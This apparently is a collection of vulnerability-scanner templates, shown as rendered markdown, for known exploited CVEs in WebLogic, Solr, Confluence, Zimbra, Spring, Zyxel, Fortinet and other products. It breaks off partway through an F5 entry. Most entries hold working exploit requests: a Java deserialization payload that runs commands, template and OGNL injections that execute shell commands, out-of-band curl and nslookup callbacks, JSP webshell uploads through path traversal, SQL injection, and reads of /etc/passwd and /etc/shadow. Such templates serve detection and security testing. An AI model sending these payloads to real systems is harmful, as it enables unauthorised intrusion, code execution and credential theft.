<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>org.slf4j.ext.EventData</string><void><string><java><void class="sun.misc.BASE64Decoder"><void method="decodeBuffer" id="byte_arr"><string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string></void></void><void class="org.mozilla.classfile.DefiningClassLoader"><void method="defineClass"><string>ResultBaseExec</string><object idref="byte_arr"></object><void method="newInstance"><void method="do_exec" id="result"><string>id</string></void></void></void></void><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork" id="current_work"><void method="getClass"><void method="getDeclaredField"><string>connectionHandler</string><void method="setAccessible"><boolean>true</boolean></void><void method="get"><object idref="current_work"></object><void method="getServletRequest"><void method="getResponse"><void method="getServletOutputStream"><void method="writeStream"><object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object></void><void method="flush"/></void><void method="getWriter"><void method="write"><string></string></void></void></void></void></void></void></void></void></void></java></string></void></class></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>

```

### Matchers

**Type - word**

- part - body
- words
  1. uid=
  2. gid=
  3. groups=
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Solr \<=8.3.1 - Remote Code Execution

## Description

- Apache Solr versions 5.0.0 to 8.3.1 are vulnerable to remote code execution vulnerabilities through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset `velocity/ directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting `params.resource.loader.enabled by defining a response writer with that setting set to `true`. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is `trusted` (has been uploaded by an authenticated user).
- severity - high
- tags - cve,cve2019,apache,rce,solr,oast,kev

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /solr/{{core}}/config HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "update-queryresponsewriter": {
      "startup": "lazy",
      "name": "velocity",
      "class": "solr.VelocityResponseWriter",
      "template.base.dir": "",
      "solr.resource.loader.enabled": "true",
      "params.resource.loader.enabled": "true"
    }
}

```

### Step - 3

```
GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: {{Hostname}}
Connection: close

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# SonicWall SRA 4600 VPN - SQL Injection

## Description

- The SonicWall SRA 4600 VPN appliance is susceptible to a pre-authentication SQL injection vulnerability.
- severity - high
- tags - cve,cve2019,sonicwall,sqli,kev

## Requests

### Step - 1

```
POST /cgi-bin/supportInstaller HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: identity
User-Agent: MSIE
Content-Type: application/x-www-form-urlencoded

fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,11132*379123,0,0,0,0--

```

### Matchers

**Type - word**

- words
  1. 4220397236
- part - body

---

# Atlassian Crowd and Crowd Data Center Unauthenticated Remote Code Execution

## Description

- Atlassian Crowd and Crowd Data Center is susceptible to a remote code execution vulnerability because the pdkinstall development plugin is incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center. All versions of Crowd from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x), from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x),from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x), from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x), and from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x) are affected by this vulnerability.
- severity - critical
- tags - cve,cve2019,atlassian,rce,kev,cisa

## Requests

- Method - GET

### URL

- {{BaseURL}}/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow

### Matchers

**Type - word**

- words
  1. root:\*:
  2. bin:\*:
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# PHP CGI v5.3.12/5.4.2 Remote Code Execution

## Description

- sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when configured as a CGI script (aka php-cgi), does not properly handle query strings that lack an = (equals sign) character, which allows remote attackers to execute arbitrary code by placing command-line options in the query string, related to lack of skipping a certain php_getopt for the 'd' case.

- severity - critical
- tags - cve2012,kev,vulhub,rce,php,cve

## Requests

### Step - 1

```
POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

<?php echo shell_exec("cat /etc/passwd"); ?>

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- condition - and

**Type - status**

- status
  1. 200

---

# Zimbra Collaboration Suite 8.8.15/9.0 - Remote Code Execution

## Description

- Zimbra Collaboration Suite (ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. By bypassing authentication (i.e., not having an authtoken), an attacker can upload arbitrary files to the system, leading to directory traversal and remote code execution. NOTE: this issue exists because of an incomplete fix for CVE-2022-27925.

- severity - critical
- tags - cve,cve2022,zimbra,rce,unauth,kev

## Requests

### Step - 1

```
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded

{{hex_decode("504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000f00000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b05060000000002000200d6000000e00100000000")}}

```

### Step - 2

```
GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 401
  2. status_code_2 == 200
  3. contains(body_2,'NcbWd0XGajaWS4DmOvZaCkxL1aPEXOZu')
- condition - and

**Payloads**- path

---

# Sophos Firewall \<=18.5 MR3 - Remote Code Execution

## Description

- Sophos Firewall version v18.5 MR3 and older contains an authentication bypass vulnerability in the User Portal and Webadmin which could allow a remote attacker to execute code.

- severity - critical
- tags - cve,cve2022,sophos,firewall,auth-bypass,rce,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/userportal/Controller?mode=8700&operation=1&datagrid=179&json={"🦞":"test"}

### Matchers

**Type - word**

- part - body
- words
  1. {"status":"Session Expired"}

**Type - word**

- part - header
- words
  1. Server: xxxx

**Type - status**

- status
  1. 200

---

# DotCMS - Arbitrary File Upload

## Description

- DotCMS management system contains an arbitrary file upload vulnerability via the /api/content/ path which can allow attackers to upload malicious Trojans to obtain server permissions.
- severity - critical
- tags - packetstorm,cve,cve2022,rce,dotcms,kev,fileupload,intrusive

## Requests

### Step - 1

```
POST /api/content/ HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3

--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; filename="../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/{{randstr}}.jsp"
Content-Type: text/plain

<%
out.println("CVE-2022-26352");
%>
--------------------------aadc326f7ae3eac3--

```

### Step - 2

```
GET /{{randstr}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "CVE-2022-26352")
  2. status_code_2 == 200
- condition - and

---

# QNAP QTS Photo Station External Reference

## Description

- An externally controlled reference to a resource vulnerability has been reported to affect QNAP NAS running Photo Station. If exploited, This could allow an attacker to modify system files. We have already fixed the vulnerability in the following versions: QTS 5.0.1: Photo Station 6.1.2 and later QTS 5.0.0/4.5.x: Photo Station 6.0.22 and later QTS 4.3.6: Photo Station 5.7.18 and later QTS 4.3.3: Photo Station 5.4.15 and later QTS 4.2.6: Photo Station 5.2.14 and later

- severity - critical
- tags - cve,cve2022,qnap,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php.

### Matchers

**Type - word**

- part - response
- words
  1. !function(p,qa){
  2. module.exports
  3. application/javascript
- condition - and

**Type - status**

- status
  1. 200

---

# Atlassian Bitbucket Command Injection Vulnerability

## Description

- Multiple API endpoints in Atlassian Bitbucket Server and Data Center 7.0.0 before version 7.6.17, from version 7.7.0 before version 7.17.10, from version 7.18.0 before version 7.21.4, from version 8.0.0 before version 8.0.3, from version 8.1.0 before version 8.1.3, and from version 8.2.0 before version 8.2.2, and from version 8.3.0 before 8.3.1 allows remote attackers with read permissions to a public or private Bitbucket repository to execute arbitrary code by sending a malicious HTTP request.

- severity - high
- tags - cve,cve2022,bitbucket,atlassian,kev

## Requests

### Step - 1

```
GET /rest/api/latest/repos HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /rest/api/latest/projects/{{key}}/repos/{{slug}}/archive?filename={{data}}&at={{data}}&path={{data}}&prefix=ax%00--exec=%60id%60%00--remote=origin HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- words
  1. com.atlassian.bitbucket.scm.CommandFailedException

**Type - status**

- status
  1. 500

### Extractors

**Type - json**

- part - body
- name - key
- json
  1. .["values"] | .[] | .["project"] | .key
- internal - True

**Type - json**

- part - body
- name - slug
- json
  1. .["values"] | .[] | .slug
- internal - True

**Type - regex**

- group - 1
- regex
  1. uid=.\*\(([a-z]+)\):

---

# Confluence - Remote Code Execution

## Description

- Confluence Server and Data Center is susceptible to an unauthenticated remote code execution vulnerability.

- severity - critical
- tags - cve,cve2022,confluence,rce,ognl,oast,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
- {{BaseURL}}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{{interactsh-url}}%22%29%7D/

### Matchers

**Type - dsl**

- dsl
  1. contains(to_lower(all_headers_1), "x-cmd-response:")

**Type - dsl**

- dsl
  1. contains(interactsh_protocol, "dns")
  2. contains(to_lower(response_2), "confluence")
- condition - and

### Extractors

**Type - kval**

- part - header
- kval
  1. x_cmd_response

---

# WSO2 Management - Arbitrary File Upload & Remote Code Execution

## Description

- Certain WSO2 products allow unrestricted file upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.

- severity - critical
- tags - cve,cve2022,rce,fileupload,wso2,intrusive,kev

## Requests

### Step - 1

```
POST /fileupload/toolsAny HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
Content-Length: 348

-----------------------------250033711231076532771336998311
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp";filename="test.jsp"
Content-Type: application/octet-stream

<% out.print("WSO2-RCE-CVE-2022-29464"); %>
-----------------------------250033711231076532771336998311--

```

### Step - 2

```
GET /authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, 'WSO2-RCE-CVE-2022-29464')

---

# Spring Cloud - Remote Code Execution

## Description

- Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions are susceptible to remote code execution vulnerabilities. When using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources.

- severity - critical
- tags - vulhub,cve,cve2022,springcloud,rce,kev

## Requests

### Step - 1

```
POST /functionRouter HTTP/1.1
Host: {{Hostname}}
spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("{{interactsh-url}}")
Content-Type: application/x-www-form-urlencoded

{{rand_base(8)}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http
  2. dns
- condition - or

**Type - status**

- status
  1. 500

---

# Redis Sandbox Escape - Remote Code Execution

## Description

- This template exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The
  vulnerability was introduced by Debian and Ubuntu Redis packages that
  insufficiently sanitized the Lua environment. The maintainers failed to
  disable the package interface, allowing attackers to load arbitrary libraries.

- severity - critical
- tags - cve,cve2022,network,redis,unauth,rce,kev

---

# Fortinet - Authentication Bypass

## Description

- Fortinet contains an authentication bypass vulnerability via using an alternate path or channel in FortiOS 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy 7.2.0 and 7.0.0 through 7.0.6, and FortiSwitchManager 7.2.0 and 7.0.0. An attacker can perform operations on the administrative interface via specially crafted HTTP or HTTPS requests, thus making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - critical
- tags - cve,cve2022,fortinet,fortigate,fortios,fortiproxy,auth-bypass,kev

## Requests

### Step - 1

```
GET /api/v2/cmdb/system/admin HTTP/1.1
Host: {{Hostname}}
User-Agent: Node.js
Forwarded: by="[127.0.0.1]:1337";for="[127.0.0.1]:1337";proto=http;host=
X-Forwarded-Vdom: root

```

### Step - 2

```
PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
Host: {{Hostname}}
User-Agent: Report Runner
Content-Type: application/json
Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;
Content-Length: 610

 {
  "ssh-public-key1":"{{randstr}}"
}

```

### Matchers

**Type - word**

- part - body_1
- words
  1. ENC XXXX
  2. http_method
- condition - and

**Type - word**

- part - body_2
- words
  1. Invalid SSH public key.
  2. cli_error
- condition - and

---

# Questions For Confluence - Hardcoded Credentials

## Description

- A remote, unauthenticated attacker with knowledge of the hardcoded password could exploit this to log into Confluence and access all content accessible to users in the confluence-users group.

- severity - critical
- tags - cve,cve2022,confluence,atlassian,default-login,kev

## Requests

### Step - 1

```
POST /dologin.action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

os_username={{os_username}}&os_password={{os_password}}&login=Log+in&os_destination=%2Fhttpvoid.action

```

### Matchers

**Type - dsl**

- dsl
  1. location == "/httpvoid.action"

**Payloads**- os_username

- os_password

---

# Spring Cloud Gateway Code Injection

## Description

- Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+ are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.
- severity - critical
- tags - cve,cve2022,apache,spring,vmware,actuator,oast,kev

## Requests

### Step - 1

```
POST /actuator/gateway/routes/{{randstr}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/{{randstr}}/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "{{RootURL}}",
  "order": 0
}

```

### Step - 2

```
POST /actuator/gateway/refresh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "predicate": "Paths: [/{{randstr}}], match trailing slash: true",
  "route_id": "{{randstr}}",
  "filters": [
    "[[RewritePath #{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")} = /${path}], order = 1]"
  ],
  "uri": "{{RootURL}}",
  "order": 0
}

```

### Step - 3

```
DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - status**

- status
  1. 201

**Type - word**

- part - header
- words
  1. /routes/{{randstr}}

**Type - word**

- part - interactsh_protocol
- words
  1. dns

---

# Zoho ManageEngine - Remote Code Execution

## Description

- Zoho ManageEngine Password Manager Pro, PAM 360, and Access Manager Plus are susceptible to unauthenticated remote code execution via XML-RPC. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2022,rce,zoho,passwordmanager,deserialization,unauth,msf,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{RootURL}}/xmlrpc
  - <?xml version="1.0"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>

---

# Apache APISIX - Remote Code Execution

## Description

- A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution. An attacker can abuse the batch-requests plugin to send requests to bypass the IP restriction of Admin API. When the admin key was changed or the port of Admin API was changed to a port different from the data panel, the impact is lower. But there is still a risk to bypass the IP restriction of Apache APISIX's data panel. There is a check in the batch-requests plugin which overrides the client IP with its real remote IP. But due to a bug in the code, this check can be bypassed.
- severity - critical
- tags - cve,cve2022,apache,rce,apisix,oast,kev

## Requests

### Step - 1

```
POST /apisix/batch-requests HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{
  "headers":{
    "X-Real-IP":"127.0.0.1",
    "Content-Type":"application/json"
  },
  "timeout":1500,
  "pipeline":[
    {
      "method":"PUT",
      "path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
      "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/{{randstr}}\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl {{interactsh-url}}/`whoami`'); return true end\"}"
    }
  ]
}

```

### Step - 2

```
GET /api/{{randstr}} HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```

### Matchers

**Type - word**

- part - body_1
- words
  1. "reason":"OK"
  2. "status":200
- condition - and

**Type - status**

- status
  1. 200

**Type - word**

- part - interactsh_protocol
- words
  1. http

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. GET \/([a-z-]+) HTTP

---

# Zabbix - SAML SSO Authentication Bypass

## Description

- When SAML SSO authentication is enabled (non-default), session data can be modified by a malicious actor because a user login stored in the session was not verified.
- severity - critical
- tags - cve,cve2022,zabbix,auth-bypass,saml,sso,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/zabbix/index_sso.php
- {{BaseURL}}/index_sso.php

### Matchers

**Type - status**

- status
  1. 302

**Type - dsl**

- dsl
  1. contains(tolower(all_headers), 'location: zabbix.php?action=dashboard.view')

---

# Zyxel Firewall - OS Command Injection

## Description

- An OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, are susceptible to a command injection vulnerability which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.

- severity - critical
- tags - zyxel,cve,cve2022,firewall,unauth,kev,msf,rce

## Requests

### Step - 1

```
POST /ztp/cgi-bin/handler HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; curl {{interactsh-url}};","data":"hi"}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 500

---

# VMware Workspace ONE Access - Server-Side Template Injection

## Description

- VMware Workspace ONE Access is susceptible to a remote code execution vulnerability due to a server-side template injection flaw. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager.

- severity - critical
- tags - workspaceone,kev,tenable,packetstorm,cve,cve2022,vmware,ssti

## Requests

- Method - GET

### URL

- {{BaseURL}}/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d

### Matchers

**Type - word**

- part - body
- words
  1. Authorization context is not valid

**Type - status**

- status
  1. 400

---

# Spring - Remote Code Execution

## Description

- Spring MVC and Spring WebFlux applications running on Java Development Kit 9+ are susceptible to remote code execution via data binding. It requires the application to run on Tomcat as a WAR deployment. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2022,rce,spring,injection,oast,intrusive,kev

## Requests

### Step - 1

```
POST {{BaseURL}} HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.configFile={{interact_protocol}}://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx

```

### Step - 2

```
GET /?class.module.classLoader.resources.context.configFile={{interact_protocol}}://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - word**

- part - interactsh_request
- words
  1. User-Agent: Java
- case-insensitive - True

**Payloads**- interact_protocol

---

# SAP Memory Pipes (MPI) Desynchronization

## Description

- SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable to request smuggling and request concatenation attacks. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system.
- severity - critical
- tags - cve,cve2022,sap,smuggling,netweaver,web-dispatcher,memory-pipes,kev

## Requests

### Step - 1

```
GET {{sap_path}} HTTP/1.1
Host: {{Hostname}}
Content-Length: 82646
Connection: keep-alive

{{repeat("A", 82642)}}

GET / HTTP/1.1
Host: {{Hostname}}


```

### Matchers

**Type - status**

- status
  1. 200

**Type - dsl**

- dsl
  1. contains(tolower(body), 'administration')
  2. contains(tolower(all_headers), 'content-type: image/png')
- condition - or

**Type - word**

- part - body
- words
  1. HTTP/1.0 400 Bad Request
  2. HTTP/1.0 500 Internal Server Error
  3. HTTP/1.0 500 Dispatching Error
- condition - or

**Payloads**- sap_path

---

# F5 BIG-IP iControl - REST Auth Bypass RCE

## Description

- F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, may allow undisclosed requests to bypass iControl REST authentication.

- severity - critical
